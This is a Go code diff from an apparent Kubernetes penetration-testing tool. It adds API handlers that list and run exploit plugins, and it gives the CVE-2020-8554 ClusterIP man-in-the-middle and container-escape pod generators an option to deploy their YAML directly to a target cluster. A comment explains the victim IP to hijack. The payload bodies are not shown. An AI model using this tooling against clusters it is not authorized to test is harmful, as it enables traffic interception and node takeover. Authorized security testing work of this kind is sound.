@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/gin-gonic/gin"
+	"github.com/trymonoly/K8sPenTool-ng/internal/exploit"
 	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
 	"github.com/trymonoly/K8sPenTool-ng/internal/util"
 	corev1 "k8s.io/api/core/v1"
@@ -22,6 +23,41 @@ type CDKHandler struct{}
 
 func NewCDKHandler() *CDKHandler {
 	return &CDKHandler{}
+}
+
+func (h *CDKHandler) ListPlugins(c *gin.Context) {
+	items := exploit.ListByType("cdk")
+	sort.Slice(items, func(i, j int) bool { return items[i].Name() < items[j].Name() })
+	result := make([]gin.H, 0, len(items))
+	for _, item := range items {
+		result = append(result, gin.H{
+			"name":        item.Name(),
+			"description": item.Desc(),
+			"type":        item.Type(),
+			"risk_level":  item.RiskLevel(),
+			"parameters":  item.Parameters(),
+		})
+	}
+	c.JSON(http.StatusOK, gin.H{"plugins": result, "total": len(result)})
+}
+
+func (h *CDKHandler) RunPlugin(c *gin.Context) {
+	item, ok := exploit.Get(c.Param("name"))
+	if !ok {
+		c.JSON(http.StatusNotFound, gin.H{"error": "cdk plugin not found"})
+		return
+	}
+	var req map[string]interface{}
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
+	}
+	result, err := item.Run(c.Request.Context(), req)
+	if err != nil {
+		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
+		return
+	}
+	c.JSON(http.StatusOK, result)
 }
 
 func (h *CDKHandler) buildClient(c *gin.Context) (*kubectl.Client, error) {
@@ -498,6 +534,7 @@ type mitmRequest struct {
 	TargetIP   string `json:"target_ip"` // legacy alias
 	VictimIP   string `json:"victim_ip"`
 	TargetPort int    `json:"target_port"`
+	Apply      bool   `json:"apply"`
 }
 
 func (h *CDKHandler) ClusterIPMITM(c *gin.Context) {
@@ -510,11 +547,14 @@ func (h *CDKHandler) ClusterIPMITM(c *gin.Context) {
 	if req.TargetPort == 0 {
 		req.TargetPort = 443
 	}
+	if req.TimeoutSec == 0 {
+		req.TimeoutSec = 15
+	}
 
 	// Generate CVE-2020-8554 exploit YAML
 	mitmYAML := buildClusterIPMITMYAML(victimIP, req.TargetPort)
 
-	c.JSON(http.StatusOK, gin.H{
+	resp := gin.H{
 		"yaml":       mitmYAML,
 		"cve":        "CVE-2020-8554",
 		"victim_ip":  victimIP,
@@ -525,7 +565,26 @@ func (h *CDKHandler) ClusterIPMITM(c *gin.Context) {
 				"Use Apply to deploy this YAML.", victimIP, victimIP, req.TargetPort),
 		"note":         "这里的 ExternalIP 应填写你想劫持的受害目标 IP，而不是攻击者节点 IP。",
 		"mitigated_by": "K8s 1.18+ with DenyServiceExternalIPs admission controller",
-	})
+		"applied":      false,
+		"preview":      !req.Apply,
+	}
+	if req.Apply {
+		client, err := kubectl.NewTargetClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
+		if err != nil {
+			resp["error"] = err.Error()
+			c.JSON(http.StatusOK, resp)
+			return
+		}
+		ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
+		defer cancel()
+		applied, err := client.ApplyYAML(ctx, mitmYAML)
+		resp["applied"] = applied
+		resp["preview"] = false
+		if err != nil {
+			resp["error"] = err.Error()
+		}
+	}
+	c.JSON(http.StatusOK, resp)
 }
 
 func resolveMITMVictimIP(req mitmRequest) string {
@@ -595,6 +654,7 @@ type escapePodRequest struct {
 	Command    string `json:"command"`
 	Namespace  string `json:"namespace"`
 	NodeName   string `json:"node_name"`
+	Apply      bool   `json:"apply"`
 }
 
 func (h *CDKHandler) GenerateEscapePod(c *gin.Context) {
@@ -623,7 +683,7 @@ func (h *CDKHandler) GenerateEscapePod(c *gin.Context) {
 	// Generate post-deploy exploit commands
 	exploitCommands := h.getExploitCommands(req.EscapeMode)
 
-	c.JSON(http.StatusOK, gin.H{
+	resp := gin.H{
 		"yaml":             yaml,
 		"escape_mode":      req.EscapeMode,
 		"namespace":        req.Namespace,
@@ -636,7 +696,29 @@ func (h *CDKHandler) GenerateEscapePod(c *gin.Context) {
 			"step3": "Exec into pod via Exec Tab or Kubelet Exec",
 			"step4": "Run exploit commands shown below",
 		},
-	})
+		"applied": false,
+		"preview": !req.Apply,
+	}
+	if req.Apply {
+		if req.TimeoutSec == 0 {
+			req.TimeoutSec = 15
+		}
+		client, err := kubectl.NewTargetClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
+		if err != nil {
+			resp["error"] = err.Error()
+			c.JSON(http.StatusOK, resp)
+			return
+		}
+		ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
+		defer cancel()
+		applied, err := client.ApplyYAML(ctx, yaml)
+		resp["applied"] = applied
+		resp["preview"] = false
+		if err != nil {
+			resp["error"] = err.Error()
+		}
+	}
+	c.JSON(http.StatusOK, resp)
 }
 
 func normalizeEscapeMode(mode string) string {
